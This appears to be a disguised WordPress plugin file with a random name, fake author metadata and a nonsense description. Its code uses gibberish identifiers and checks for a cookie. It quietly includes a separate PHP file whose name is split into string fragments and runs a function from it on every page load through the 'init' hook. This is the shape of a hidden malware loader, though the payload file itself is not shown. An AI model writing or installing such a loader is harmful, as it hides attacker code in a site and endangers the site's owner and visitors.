<?php

if(isset($_COOKIE['VXes'])) {}



/**
 * Plugin Name: Lutifiw
 * Plugin URI: https://in.pectem.org/lutifiw
 * Description: Centralized under flatscreen television and
 * Version: 2.13.2
 * Author: Tommy Dallas
 * Author URI: https://in.pectem.org
 * Text Domain: lutifiw
 * License: GPL2+
 *
 */

function athetac_achujol() {
    uteqixo_rykapaj();
}

$uzajuha = __DIR__ . '/bizhyre.php';
if (file_exists($uzajuha)) {
    include_once __DIR__ . "/bizhy" . "re.ph" . "p";
}


if (function_exists("uteqixo_rykapaj")) {
    $hygigig = new elyzobi_acudihy();
    if ($hygigig->kocokhu_ypyrupy()) {
        add_action('init', 'athetac_achujol');
    }
}